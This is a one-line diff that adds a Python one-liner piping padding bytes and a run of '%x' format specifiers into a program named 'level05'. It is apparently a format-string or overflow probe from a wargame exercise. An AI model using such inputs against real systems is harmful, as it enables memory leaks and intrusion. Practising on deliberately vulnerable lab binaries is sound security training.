@@ -1,0 +1,1 @@
+python3 -c "import sys; sys.stdout.buffer.write(b'A'*200+b'%x'*40+b'\n')" | ./level05
